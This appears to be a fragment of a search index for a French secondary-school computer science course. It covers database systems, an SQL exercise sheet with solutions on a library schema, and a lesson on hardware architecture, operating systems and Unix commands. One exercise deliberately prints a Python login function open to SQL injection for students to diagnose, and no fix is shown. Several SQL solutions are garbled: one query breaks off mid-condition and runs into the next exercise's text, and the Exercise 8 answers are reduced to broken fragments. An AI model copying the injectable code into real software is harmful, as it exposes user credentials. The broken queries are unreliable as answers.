d'usage, justifiez le choix du SGBD : 1. Application mobile avec base de donn\u00e9es locale 2. Site e-commerce avec forte charge 3. Syst\u00e8me de gestion documentaire 4. Application d'analyse de r\u00e9seaux sociaux</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#exercice-3-securite","title":"Exercice 3 : S\u00e9curit\u00e9","text":"<p>Identifiez les failles de s\u00e9curit\u00e9 dans ce code Python :</p> <pre><code>def authentifier_utilisateur(nom, mot_de_passe):\n    connexion = sqlite3.connect('users.db')\n    curseur = connexion.cursor()\n\n    requete = f\"SELECT id FROM users WHERE nom='{nom}' AND password='{mot_de_passe}'\"\n    curseur.execute(requete)\n\n    if curseur.fetchone():\n        return True\n    return False\n</code></pre> <p>Proposez une version corrig\u00e9e.</p>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#tendances-actuelles","title":"Tendances actuelles","text":""},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#cloud-et-bases-de-donnees","title":"Cloud et bases de donn\u00e9es","text":"<ul> <li>Database as a Service (DBaaS) : Amazon RDS, Google Cloud SQL</li> <li>Bases de donn\u00e9es serverless : AWS Aurora Serverless</li> <li>Multi-cloud : Portabilit\u00e9 entre fournisseurs</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#big-data-et-analytique","title":"Big Data et analytique","text":"<ul> <li>Data Warehouses : Stockage pour l'analyse</li> <li>Data Lakes : Stockage de donn\u00e9es brutes</li> <li>OLAP vs OLTP : Optimisation pour l'analyse vs transactions</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#intelligence-artificielle","title":"Intelligence artificielle","text":"<ul> <li>Bases de donn\u00e9es vectorielles : Pour l'IA et le machine learning</li> <li>Optimisation automatique : Tuning automatique des performances</li> <li>Requ\u00eates en langage naturel : Interface conversationnelle</li> </ul>"},{"location":"terminale/III-Bases_de_donnees/Cours/sgbd/#conclusion","title":"Conclusion","text":"<p>Les SGBD sont des outils essentiels dans le paysage informatique moderne. Leur \u00e9volution continue r\u00e9pond aux besoins croissants de : - Performance : Gestion de volumes de donn\u00e9es toujours plus importants - Disponibilit\u00e9 : Syst\u00e8mes fonctionnant 24h/24, 7j/7 - S\u00e9curit\u00e9 : Protection contre les cyberattaques - Flexibilit\u00e9 : Adaptation aux nouveaux types de donn\u00e9es et d'usages</p> <p>La ma\u00eetrise des concepts fondamentaux des SGBD est cruciale pour tout d\u00e9veloppeur ou administrateur de syst\u00e8mes d'information.</p>"},{"location":"terminale/III-Bases_de_donnees/Exercices/fiche_exercices_sql/","title":"Exercices SQL - Bases de donn\u00e9es","text":""},{"location":"terminale/III-Bases_de_donnees/Exercices/fiche_exercices_sql/#schema-de-la-base-de-donnees","title":"Sch\u00e9ma de la base de donn\u00e9es","text":"<p>\ud83d\udcca Base de donn\u00e9es : Biblioth\u00e8que</p> <p>Table AUTEURS - <code>id_auteur</code> (INTEGER, PK) : Identifiant unique - <code>nom</code> (VARCHAR(50)) : Nom de famille - <code>prenom</code> (VARCHAR(50)) : Pr\u00e9nom - <code>date_naissance</code> (DATE) : Date de naissance - <code>nationalite</code> (VARCHAR(30)) : Nationalit\u00e9</p> <p>Table LIVRES - <code>isbn</code> (VARCHAR(17), PK) : Code ISBN - <code>titre</code> (VARCHAR(200)) : Titre du livre - <code>id_auteur</code> (INTEGER, FK) : R\u00e9f\u00e9rence vers AUTEURS - <code>annee_publication</code> (INTEGER) : Ann\u00e9e de publication - <code>nb_pages</code> (INTEGER) : Nombre de pages - <code>genre</code> (VARCHAR(50)) : Genre litt\u00e9raire</p> <p>Table LECTEURS - <code>id_lecteur</code> (INTEGER, PK) : Identifiant unique - <code>nom</code> (VARCHAR(50)) : Nom de famille - <code>prenom</code> (VARCHAR(50)) : Pr\u00e9nom - <code>email</code> (VARCHAR(100)) : Adresse email - <code>date_inscription</code> (DATE) : Date d'inscription</p> <p>Table EMPRUNTS - <code>id_emprunt</code> (INTEGER, PK) : Identifiant unique - <code>isbn</code> (VARCHAR(17), FK) : R\u00e9f\u00e9rence vers LIVRES - <code>id_lecteur</code> (INTEGER, FK) : R\u00e9f\u00e9rence vers LECTEURS - <code>date_emprunt</code> (DATE) : Date d'emprunt - <code>date_retour_prevue</code> (DATE) : Date de retour pr\u00e9vue - <code>date_retour_effective</code> (DATE) : Date de retour effective (NULL si non rendu)</p>"},{"location":"terminale/III-Bases_de_donnees/Exercices/fiche_exercices_sql/#exercices","title":"Exercices","text":"<pre><code>Requ\u00eates de base\nJointures\nAgr\u00e9gation\nAvanc\u00e9\n</code></pre> <p>Exercice 1 : S\u00e9lections simples Facile</p> <p>Questions :</p> <ol> <li>Affichez tous les livres de la base de donn\u00e9es.</li> <li>Affichez uniquement les titres et ann\u00e9es de publication des livres.</li> <li>Trouvez tous les livres publi\u00e9s apr\u00e8s 2000.</li> <li>Listez tous les auteurs fran\u00e7ais.</li> <li>Affichez les livres de science-fiction de plus de 300 pages.</li> </ol> <p>Voir la solution</p> <pre><code>-- 1. Tous les livres\nSELECT * FROM livres;\n\n-- 2. Titres et ann\u00e9es\nSELECT titre, annee_publication FROM livres;\n\n-- 3. Livres apr\u00e8s 2000\nSELECT * FROM livres WHERE annee_publication &gt; 2000;\n\n-- 4. Auteurs fran\u00e7ais\nSELECT * FROM auteurs WHERE nationalite = 'Fran\u00e7aise';\n\n-- 5. Science-fiction &gt; 300 pages\nSELECT * FROM livres\nWHERE genre = 'Science-fiction' AND nb_pages &gt; 300;\n</code></pre> <p>Exercice 2 : Tri et limitation Facile</p> <p>Questions :</p> <ol> <li>Affichez les livres tri\u00e9s par ann\u00e9e de publication (du plus r\u00e9cent au plus ancien).</li> <li>Trouvez les 5 livres les plus longs.</li> <li>Listez les auteurs par ordre alphab\u00e9tique de nom.</li> <li>Affichez les 10 premiers emprunts par date.</li> </ol> <p>Voir la solution</p> <pre><code>-- 1. Livres par ann\u00e9e (r\u00e9cent \u2192 ancien)\nSELECT * FROM livres ORDER BY annee_publication DESC;\n\n-- 2. 5 livres les plus longs\nSELECT titre, nb_pages FROM livres\nORDER BY nb_pages DESC LIMIT 5;\n\n-- 3. Auteurs par ordre alphab\u00e9tique\nSELECT * FROM auteurs ORDER BY nom, prenom;\n\n-- 4. 10 premiers emprunts\nSELECT * FROM emprunts\nORDER BY date_emprunt LIMIT 10;\n</code></pre> <p>Exercice 3 : Jointures simples Moyen</p> <p>Questions :</p> <ol> <li>Affichez les livres avec le nom complet de leur auteur.</li> <li>Listez tous les emprunts avec le titre du livre emprunt\u00e9.</li> <li>Trouvez les emprunts en cours avec les d\u00e9tails du lecteur.</li> <li>Affichez tous les auteurs, m\u00eame ceux qui n'ont pas \u00e9crit de livres.</li> </ol> <p>Voir la solution</p> <pre><code>-- 1. Livres avec auteurs\nSELECT l.titre, a.nom, a.prenom\nFROM livres l\nINNER JOIN auteurs a ON l.id_auteur = a.id_auteur;\n\n-- 2. Emprunts avec titres\nSELECT e.date_emprunt, l.titre\nFROM emprunts e\nINNER JOIN livres l ON e.isbn = l.isbn;\n\n-- 3. Emprunts en cours avec lecteurs\nSELECT e.date_emprunt, l.titre, lec.nom, lec.prenom\nFROM emprunts e\nINNER JOIN livres l ON e.isbn = l.isbn\nINNER JOIN lecteurs lec ON e.id_lecteur = lec.id_lecteur\nWHERE e.date_retour_effective IS NULL;\n\n-- 4. Tous les auteurs (m\u00eame sans livres)\nSELECT a.nom, a.prenom, l.titre\nFROM auteurs a\nLEFT JOIN livres l ON a.id_auteur = l.id_auteur;\n</code></pre> <p>Exercice 4 : Jointures complexes Moyen</p> <p>Questions :</p> <ol> <li>Affichez tous les emprunts avec les d\u00e9tails complets (lecteur, livre, auteur).</li> <li>Trouvez les lecteurs qui n'ont jamais emprunt\u00e9 de livre.</li> <li>Listez les livres jamais emprunt\u00e9s.</li> <li>Affichez les emprunts en retard avec toutes les informations.</li> </ol> <p>Voir la solution</p> <pre><code>-- 1. Emprunts avec d\u00e9tails complets\nSELECT\n    lec.nom AS lecteur_nom,\n    lec.prenom AS lecteur_prenom,\n    l.titre,\n    a.nom AS auteur_nom,\n    a.prenom AS auteur_prenom,\n    e.date_emprunt,\n    e.date_retour_prevue\nFROM emprunts e\nINNER JOIN lecteurs lec ON e.id_lecteur = lec.id_lecteur\nINNER JOIN livres l ON e.isbn = l.isbn\nINNER JOIN auteurs a ON l.id_auteur = a.id_auteur;\n\n-- 2. Lecteurs sans emprunts\nSELECT lec.nom, lec.prenom\nFROM lecteurs lec\nLEFT JOIN emprunts e ON lec.id_lecteur = e.id_lecteur\nWHERE e.id_lecteur IS NULL;\n\n-- 3. Livres jamais emprunt\u00e9s\nSELECT l.titre, a.nom, a.prenom\nFROM livres l\nINNER JOIN auteurs a ON l.id_auteur = a.id_auteur\nLEFT JOIN emprunts e ON l.isbn = e.isbn\nWHERE e.isbn IS NULL;\n\n-- 4. Emprunts en retard\nSELECT\n    lec.nom,\n    lec.prenom,\n    l.titre,\n    e.date_retour_prevue,\n    (julianday('now') - julianday(e.date_retour_prevue)) AS jours_retard\nFROM emprunts e\nINNER JOIN lecteurs lec ON e.id_lecteur = lec.id_lecteur\nINNER JOIN livres l ON e.isbn = l.isbn\nWHERE e.date_retour_effective IS NULL\n  AND e.date_retour_prevue\n\nExercice 5 : Fonctions d'agr\u00e9gation\nMoyen\n\n**Questions :**\n\n1. Comptez le nombre total de livres dans la base.\n2. Trouvez le nombre moyen de pages par livre.\n3. Affichez l'ann\u00e9e de publication la plus ancienne et la plus r\u00e9cente.\n4. Comptez le nombre de livres par genre.\n5. Trouvez le genre avec le plus de livres.\n\nVoir la solution\n\n```sql\n-- 1. Nombre total de livres\nSELECT COUNT(*) AS nombre_livres FROM livres;\n\n-- 2. Nombre moyen de pages\nSELECT AVG(nb_pages) AS moyenne_pages FROM livres;\n\n-- 3. Ann\u00e9es min et max\nSELECT\n    MIN(annee_publication) AS plus_ancienne,\n    MAX(annee_publication) AS plus_recente\nFROM livres;\n\n-- 4. Livres par genre\nSELECT genre, COUNT(*) AS nombre_livres\nFROM livres\nGROUP BY genre\nORDER BY nombre_livres DESC;\n\n-- 5. Genre avec le plus de livres\nSELECT genre, COUNT(*) AS nombre_livres\nFROM livres\nGROUP BY genre\nORDER BY nombre_livres DESC\nLIMIT 1;\n</code></pre> <p>Exercice 6 : GROUP BY et HAVING Moyen</p> <p>Questions :</p> <ol> <li>Affichez le nombre de livres par auteur.</li> <li>Trouvez les auteurs qui ont \u00e9crit plus de 3 livres.</li> <li>Calculez le nombre moyen de pages par genre (genres avec plus de 2 livres).</li> <li>Listez les lecteurs avec le nombre de leurs emprunts.</li> <li>Trouvez les lecteurs qui ont emprunt\u00e9 plus de 5 livres.</li> </ol> <p>Voir la solution</p> <pre><code>-- 1. Livres par auteur\nSELECT\n    a.nom,\n    a.prenom,\n    COUNT(l.isbn) AS nombre_livres\nFROM auteurs a\nLEFT JOIN livres l ON a.id_auteur = l.id_auteur\nGROUP BY a.id_auteur, a.nom, a.prenom\nORDER BY nombre_livres DESC;\n\n-- 2. Auteurs avec plus de 3 livres\nSELECT\n    a.nom,\n    a.prenom,\n    COUNT(l.isbn) AS nombre_livres\nFROM auteurs a\nINNER JOIN livres l ON a.id_auteur = l.id_auteur\nGROUP BY a.id_auteur, a.nom, a.prenom\nHAVING COUNT(l.isbn) &gt; 3;\n\n-- 3. Moyenne pages par genre (&gt;2 livres)\nSELECT\n    genre,\n    COUNT(*) AS nombre_livres,\n    AVG(nb_pages) AS moyenne_pages\nFROM livres\nGROUP BY genre\nHAVING COUNT(*) &gt; 2;\n\n-- 4. Emprunts par lecteur\nSELECT\n    lec.nom,\n    lec.prenom,\n    COUNT(e.id_emprunt) AS nombre_emprunts\nFROM lecteurs lec\nLEFT JOIN emprunts e ON lec.id_lecteur = e.id_lecteur\nGROUP BY lec.id_lecteur, lec.nom, lec.prenom;\n\n-- 5. Lecteurs avec plus de 5 emprunts\nSELECT\n    lec.nom,\n    lec.prenom,\n    COUNT(e.id_emprunt) AS nombre_emprunts\nFROM lecteurs lec\nINNER JOIN emprunts e ON lec.id_lecteur = e.id_lecteur\nGROUP BY lec.id_lecteur, lec.nom, lec.prenom\nHAVING COUNT(e.id_emprunt) &gt; 5;\n</code></pre> <p>Exercice 7 : Sous-requ\u00eates Difficile</p> <p>Questions :</p> <ol> <li>Trouvez les livres plus longs que la moyenne.</li> <li>Affichez les auteurs qui ont \u00e9crit le plus de livres.</li> <li>Listez les livres de l'auteur le plus prolifique.</li> <li>Trouvez les lecteurs qui ont emprunt\u00e9 des livres de science-fiction.</li> </ol> <p>Voir la solution</p> <pre><code>-- 1. Livres plus longs que la moyenne\nSELECT titre, nb_pages\nFROM livres\nWHERE nb_pages &gt; (SELECT AVG(nb_pages) FROM livres);\n\n-- 2. Auteurs avec le plus de livres\nSELECT a.nom, a.prenom, COUNT(l.isbn) AS nombre_livres\nFROM auteurs a\nINNER JOIN livres l ON a.id_auteur = l.id_auteur\nGROUP BY a.id_auteur, a.nom, a.prenom\nHAVING COUNT(l.isbn) = (\n    SELECT MAX(nb_livres)\n    FROM (\n        SELECT COUNT(isbn) AS nb_livres\n        FROM livres\n        GROUP BY id_auteur\n    )\n);\n\n-- 3. Livres de l'auteur le plus prolifique\nSELECT titre\nFROM livres\nWHERE id_auteur = (\n    SELECT id_auteur\n    FROM livres\n    GROUP BY id_auteur\n    ORDER BY COUNT(*) DESC\n    LIMIT 1\n);\n\n-- 4. Lecteurs ayant emprunt\u00e9 de la science-fiction\nSELECT DISTINCT lec.nom, lec.prenom\nFROM lecteurs lec\nINNER JOIN emprunts e ON lec.id_lecteur = e.id_lecteur\nWHERE e.isbn IN (\n    SELECT isbn\n    FROM livres\n    WHERE genre = 'Science-fiction'\n);\n</code></pre> <p>Exercice 8 : Requ\u00eates complexes Difficile</p> <p>Questions :</p> <ol> <li>Trouvez les livres qui n'ont jamais \u00e9t\u00e9 emprunt\u00e9s par des lecteurs inscrits avant 2020.</li> <li>Affichez les genres o\u00f9 tous les livres ont \u00e9t\u00e9 emprunt\u00e9s au moins une fois.</li> <li>Listez les auteurs dont tous les livres font plus de 200 pages.</li> <li>Trouvez les lecteurs qui ont emprunt\u00e9 des livres de tous les genres disponibles.</li> </ol> <p>Voir la solution</p> <p>```sql -- 1. Livres jamais emprunt\u00e9s par lecteurs pr\u00e9-2020 SELECT l.titre FROM livres l WHERE l.isbn NOT IN (     SELECT DISTINCT e.isbn     FROM emprunts e     INNER JOIN lecteurs lec ON e.id_lecteur = lec.id_lecteur     WHERE lec.date_inscription  200 pages SELECT a.nom, a.prenom FROM auteurs a WHERE NOT EXISTS (     SELECT 1     FROM livres l     WHERE l.id_auteur = a.id_auteur       AND l.nb_pages</p>"},{"location":"terminale/III-Bases_de_donnees/Exercices/fiche_exercices_sql/#projet-pratique","title":"Projet pratique","text":"<p>Projet : Syst\u00e8me de recommandation Projet</p> <p>Objectif : Cr\u00e9er des requ\u00eates pour un syst\u00e8me de recommandation de livres.</p> <p>Fonctionnalit\u00e9s \u00e0 impl\u00e9menter :</p> <ol> <li>Livres similaires : Trouvez les livres du m\u00eame genre et de la m\u00eame \u00e9poque (\u00b110 ans)</li> <li>Auteurs populaires : Classez les auteurs par nombre d'emprunts de leurs livres</li> <li>Tendances : Identifiez les genres les plus emprunt\u00e9s par mois</li> <li>Recommandations personnalis\u00e9es : Pour un lecteur donn\u00e9, sugg\u00e9rez des livres bas\u00e9s sur ses emprunts pr\u00e9c\u00e9dents</li> </ol> <p>Bonus : - Cr\u00e9ez des vues pour simplifier les requ\u00eates complexes - Ajoutez des index pour optimiser les performances - Impl\u00e9mentez des proc\u00e9dures stock\u00e9es (si votre SGBD le permet)</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/","title":"Architectures mat\u00e9rielles et syst\u00e8mes d'exploitation","text":"<pre><code>\ud83c\udfd7\ufe0f Architectures mat\u00e9rielles et syst\u00e8mes d'exploitation\nComprendre le fonctionnement interne des ordinateurs\n</code></pre>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#i-architecture-de-von-neumann","title":"I. Architecture de von Neumann","text":"<p>\ud83c\udfdb\ufe0f Le mod\u00e8le fondamental</p> <p>L'architecture de von Neumann, propos\u00e9e en 1945, reste la base de la plupart des ordinateurs modernes. Elle repose sur le principe de programme enregistr\u00e9 : les instructions et les donn\u00e9es sont stock\u00e9es dans la m\u00eame m\u00e9moire.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#composants-principaux","title":"Composants principaux","text":"<p>Architecture de von Neumann</p> <p>Unit\u00e9 de Contr\u00f4le (UC) Unit\u00e9 Arithm\u00e9tique et Logique (UAL) M\u00e9moire Entr\u00e9es/Sorties</p> <p>Bus de donn\u00e9es \u2194 Bus d'adresses \u2194 Bus de contr\u00f4le</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#1-le-processeur-cpu","title":"1. Le processeur (CPU)","text":"<p>Unit\u00e9 de Contr\u00f4le (UC) : - D\u00e9code les instructions - Coordonne l'ex\u00e9cution - G\u00e8re les signaux de contr\u00f4le</p> <p>Unit\u00e9 Arithm\u00e9tique et Logique (UAL) : - Effectue les calculs arithm\u00e9tiques - R\u00e9alise les op\u00e9rations logiques - Compare les valeurs</p> <p>Registres : - M\u00e9moire ultra-rapide du processeur - Stockent temporairement les donn\u00e9es - Types : registres g\u00e9n\u00e9raux, compteur ordinal, registre d'instruction</p> <p>Exemple de cycle d'instruction :</p> <ol> <li>Fetch : Charger l'instruction depuis la m\u00e9moire</li> <li>Decode : D\u00e9coder l'instruction</li> <li>Execute : Ex\u00e9cuter l'op\u00e9ration</li> <li>Store : Stocker le r\u00e9sultat</li> </ol>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#2-la-memoire","title":"2. La m\u00e9moire","text":"<p>Registres CPU~1 ns - Quelques Ko Cache L1/L2/L3~10 ns - Quelques Mo M\u00e9moire RAM~100 ns - Quelques Go Stockage SSD~0.1 ms - Centaines de Go Stockage HDD~10 ms - T\u00e9raoctets</p> <p>Principe de localit\u00e9 : - Temporelle : Une donn\u00e9e r\u00e9cemment utilis\u00e9e sera probablement r\u00e9utilis\u00e9e - Spatiale : Les donn\u00e9es proches d'une donn\u00e9e utilis\u00e9e seront probablement utilis\u00e9es</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#3-les-bus","title":"3. Les bus","text":"<ul> <li>Bus de donn\u00e9es : Transport des informations</li> <li>Bus d'adresses : Sp\u00e9cification de l'emplacement m\u00e9moire</li> <li>Bus de contr\u00f4le : Signaux de coordination</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#limites-de-larchitecture-de-von-neumann","title":"Limites de l'architecture de von Neumann","text":"<p>Goulot d'\u00e9tranglement de von Neumann :</p> <p>Le bus unique entre CPU et m\u00e9moire limite les performances car : - Une seule op\u00e9ration \u00e0 la fois (lecture OU \u00e9criture) - La vitesse du bus limite la vitesse globale - Conflit entre acc\u00e8s aux instructions et aux donn\u00e9es</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#ii-architectures-modernes","title":"II. Architectures modernes","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#architecture-harvard","title":"Architecture Harvard","text":"<p>\ud83d\udd04 S\u00e9paration instructions/donn\u00e9es</p> <p>L'architecture Harvard s\u00e9pare physiquement la m\u00e9moire des instructions de celle des donn\u00e9es, permettant un acc\u00e8s simultan\u00e9.</p> <p>Avantages : - Acc\u00e8s simultan\u00e9 aux instructions et donn\u00e9es - Optimisation possible pour chaque type de m\u00e9moire - Meilleure s\u00e9curit\u00e9 (s\u00e9paration)</p> <p>Inconv\u00e9nients : - Complexit\u00e9 accrue - Co\u00fbt plus \u00e9lev\u00e9 - Utilisation moins flexible de la m\u00e9moire</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#architectures-paralleles","title":"Architectures parall\u00e8les","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#1-processeurs-multi-curs","title":"1. Processeurs multi-c\u0153urs","text":"<p>Processeur Quad-Core</p> <p>C\u0153ur 1L1 Cache C\u0153ur 2L1 Cache C\u0153ur 3L1 Cache C\u0153ur 4L1 Cache</p> <p>Cache L2 partag\u00e9 Cache L3 partag\u00e9</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#2-architectures-simdmimd","title":"2. Architectures SIMD/MIMD","text":"<ul> <li>SIMD (Single Instruction, Multiple Data) : Une instruction sur plusieurs donn\u00e9es</li> <li>MIMD (Multiple Instructions, Multiple Data) : Instructions diff\u00e9rentes sur donn\u00e9es diff\u00e9rentes</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#gpu-et-calcul-parallele","title":"GPU et calcul parall\u00e8le","text":"<p>GPU vs CPU :</p> <ul> <li>CPU : Peu de c\u0153urs tr\u00e8s puissants, optimis\u00e9 pour les t\u00e2ches s\u00e9quentielles</li> <li>GPU : Milliers de c\u0153urs simples, optimis\u00e9 pour le parall\u00e9lisme massif</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#iii-systemes-dexploitation","title":"III. Syst\u00e8mes d'exploitation","text":"<p>\ud83d\udda5\ufe0f Interface entre mat\u00e9riel et logiciel</p> <p>Le syst\u00e8me d'exploitation (OS) g\u00e8re les ressources mat\u00e9rielles et fournit une interface aux applications.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#fonctions-principales","title":"Fonctions principales","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#1-gestion-des-processus","title":"1. Gestion des processus","text":"<p>Nouveau Pr\u00eat En cours En attente Termin\u00e9</p> <p>Ordonnancement des processus : - FIFO (First In, First Out) - SJF (Shortest Job First) - Round Robin : Attribution cyclique du temps CPU - Priorit\u00e9s : Processus prioritaires en premier</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#exemple-de-commandes-unix-pour-la-gestion-des-processus","title":"Exemple de commandes Unix pour la gestion des processus","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#lister-les-processus-en-cours","title":"Lister les processus en cours","text":"<p>ps aux</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#afficher-les-processus-en-temps-reel","title":"Afficher les processus en temps r\u00e9el","text":"<p>top</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#tuer-un-processus","title":"Tuer un processus","text":"<p>kill -9 PID</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#lancer-un-processus-en-arriere-plan","title":"Lancer un processus en arri\u00e8re-plan","text":"<p>nohup python script.py &amp;</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#2-gestion-de-la-memoire","title":"2. Gestion de la m\u00e9moire","text":"<p>Techniques de gestion :</p> <ol> <li>Allocation contigu\u00eb : Processus en blocs contigus</li> <li>Pagination : Division en pages de taille fixe</li> <li>Segmentation : Division en segments de taille variable</li> <li>M\u00e9moire virtuelle : Illusion d'une m\u00e9moire plus grande</li> </ol> <p>M\u00e9moire virtuelle :</p> <ul> <li>Chaque processus a son espace d'adressage virtuel</li> <li>Translation automatique adresse virtuelle \u2192 physique</li> <li>Permet le swap (\u00e9change avec le disque)</li> <li>Protection entre processus</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#3-gestion-des-fichiers","title":"3. Gestion des fichiers","text":"<p>Syst\u00e8mes de fichiers courants : - FAT32 : Compatible, limit\u00e9 \u00e0 4 Go par fichier - NTFS : Windows, journalis\u00e9, permissions avanc\u00e9es - ext4 : Linux, performant, journalis\u00e9 - APFS : macOS, optimis\u00e9 pour SSD</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#commandes-de-gestion-de-fichiers-unix","title":"Commandes de gestion de fichiers Unix","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#permissions-lecture-ecriture-execution","title":"Permissions (lecture, \u00e9criture, ex\u00e9cution)","text":"<p>chmod 755 fichier.txt</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#proprietaire-et-groupe","title":"Propri\u00e9taire et groupe","text":"<p>chown user:group fichier.txt</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#espace-disque","title":"Espace disque","text":"<p>df -h du -sh dossier/</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#liens-symboliques","title":"Liens symboliques","text":"<p>ln -s /chemin/source /chemin/lien</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#4-gestion-des-entreessorties","title":"4. Gestion des entr\u00e9es/sorties","text":"<p>M\u00e9thodes d'E/S :</p> <ol> <li>E/S programm\u00e9es : CPU attend la fin de l'op\u00e9ration</li> <li>E/S par interruption : CPU lib\u00e9r\u00e9 pendant l'op\u00e9ration</li> <li>DMA (Direct Memory Access) : Transfert direct m\u00e9moire-p\u00e9riph\u00e9rique</li> </ol>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#types-de-systemes-dexploitation","title":"Types de syst\u00e8mes d'exploitation","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#1-systemes-temps-reel","title":"1. Syst\u00e8mes temps r\u00e9el","text":"<p>Contraintes temporelles strictes :</p> <ul> <li>Temps r\u00e9el dur : \u00c9ch\u00e9ance absolue (syst\u00e8mes critiques)</li> <li>Temps r\u00e9el mou : \u00c9ch\u00e9ance pr\u00e9f\u00e9rable (multim\u00e9dia)</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#2-systemes-distribues","title":"2. Syst\u00e8mes distribu\u00e9s","text":"<ul> <li>Coordination de machines multiples</li> <li>Transparence pour l'utilisateur</li> <li>Tol\u00e9rance aux pannes</li> <li>Passage \u00e0 l'\u00e9chelle</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#3-systemes-embarques","title":"3. Syst\u00e8mes embarqu\u00e9s","text":"<ul> <li>Ressources limit\u00e9es</li> <li>Consommation optimis\u00e9e</li> <li>Fiabilit\u00e9 critique</li> <li>Temps de d\u00e9marrage rapide</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#iv-virtualisation","title":"IV. Virtualisation","text":"<p>\u2601\ufe0f Abstraction des ressources</p> <p>La virtualisation permet de faire fonctionner plusieurs syst\u00e8mes d'exploitation sur une m\u00eame machine physique.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#types-de-virtualisation","title":"Types de virtualisation","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#1-virtualisation-complete","title":"1. Virtualisation compl\u00e8te","text":"<ul> <li>Hyperviseur de type 1 (bare-metal) : VMware ESXi, Hyper-V</li> <li>Hyperviseur de type 2 (hosted) : VirtualBox, VMware Workstation</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#2-paravirtualisation","title":"2. Paravirtualisation","text":"<ul> <li>OS invit\u00e9 modifi\u00e9 pour coop\u00e9rer</li> <li>Meilleures performances</li> <li>Exemple : Xen</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#3-conteneurisation","title":"3. Conteneurisation","text":"<p>Docker - Exemple de conteneurisation :</p> <pre><code># Dockerfile\nFROM python:3.9\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install -r requirements.txt\nCOPY . .\nCMD [\"python\", \"app.py\"]\n</code></pre> <pre><code># Commandes Docker\ndocker build -t mon-app .\ndocker run -p 8080:80 mon-app\ndocker ps\n</code></pre>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#avantages-de-la-virtualisation","title":"Avantages de la virtualisation","text":"<ul> <li>Consolidation : Meilleure utilisation des ressources</li> <li>Isolation : S\u00e9curit\u00e9 entre environnements</li> <li>Flexibilit\u00e9 : D\u00e9ploiement et migration faciles</li> <li>\u00c9conomies : R\u00e9duction des co\u00fbts mat\u00e9riels</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#v-securite-des-systemes","title":"V. S\u00e9curit\u00e9 des syst\u00e8mes","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#mecanismes-de-protection","title":"M\u00e9canismes de protection","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#1-controle-dacces","title":"1. Contr\u00f4le d'acc\u00e8s","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#modele-de-permissions-unix","title":"Mod\u00e8le de permissions Unix","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#rwx-rwx-rwx","title":"rwx rwx rwx","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#_1","title":"||| ||| |||","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-autres-execution","title":"||| ||| ||+-- Autres : ex\u00e9cution","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-autres-ecriture","title":"||| ||| |+--- Autres : 